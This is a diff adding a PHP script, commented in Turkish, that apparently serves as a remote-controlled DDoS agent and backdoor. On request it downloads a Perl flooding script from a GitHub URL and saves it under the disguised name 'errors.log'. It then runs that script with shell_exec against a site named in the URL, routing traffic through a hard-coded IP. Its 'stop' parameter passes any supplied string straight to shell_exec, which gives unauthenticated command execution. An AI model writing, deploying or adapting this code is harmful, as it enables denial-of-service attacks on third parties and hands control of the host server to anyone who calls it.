@@ -1,0 +1,68 @@
+	function rasgele($uzunluk)
+	{
+		$karakterler = "1234567890abcdefghijklmnopqrstuvwxyz";
+
+		for($i=0; $i < $uzunluk; $i++)
+		{
+			@$key .= $karakterler{rand(0,35)};
+		}
+
+		return $key;
+	}
+
+	if (isset($_GET['stop']))
+	{
+		error_reporting(0);
+
+		$sonlandircommand = $_GET['stop'];
+
+		shell_exec($sonlandircommand);
+
+		echo json_encode(array("ok" => 1));
+	}
+	else
+	{
+		error_reporting(0);
+		@set_time_limit($_GET["sure"]);
+
+		$site = @$_GET["site"];
+		$sure = @$_GET["sure"];
+
+		$ddosAdi = "errors.log";
+		$RastgeleIslemNumarasi =  rasgele(10);
+		$command = "perl ".$ddosAdi." ".@$site." 800 200 HEAD 41.79.33.170:8080 ".$RastgeleIslemNumarasi." > /dev/null 2>&1 & echo $!;";  
+		$sonlandircommand = "pkill -f ".$RastgeleIslemNumarasi."";
+
+		if (isset($_GET["site"]) and isset($_GET["sure"]))
+		{
+			if(file_exists($ddosAdi))
+			{
+				echo json_encode(array("stop" => $sonlandircommand));
+
+				shell_exec($command);
+
+				//sleep($sure);
+				//shell_exec($sonlandircommand);
+			}
+			else
+			{
+				touch($ddosAdi);
+
+				shell_exec("chmod 755 ".$ddosAdi."");
+
+				$ddosScript = file_get_contents("https://raw.githubusercontent.com/DaykoTEK/raw/main/dayko.pl");
+				$dosya = fopen($ddosAdi, 'w');
+
+				fwrite($dosya, $ddosScript);
+				fclose($dosya);
+
+				echo json_encode(array("stop" => $sonlandircommand));
+
+				shell_exec($command);
+
+				//sleep($sure);
+				//shell_exec($sonlandircommand);
+
+			}
+		}
+	}
